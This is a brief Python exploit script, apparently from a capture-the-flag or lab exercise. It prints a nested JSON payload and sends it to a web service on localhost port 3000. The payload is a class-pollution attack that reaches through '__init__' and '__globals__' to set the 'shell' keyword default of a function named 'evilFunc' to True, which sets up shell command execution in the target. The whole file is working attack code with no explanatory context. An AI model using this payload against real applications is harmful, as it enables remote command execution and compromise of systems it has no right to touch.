
import json

import requests

payload = {
    "__init__" : {
        "__globals__" : {
            "evilFunc" : {
                "__kwdefaults__" : {
                    "shell" : True
                }
            }
        }
    }
}

print(json.dumps(payload))


requests.post('http://127.0.0.1:3000', data=json.dumps(payload))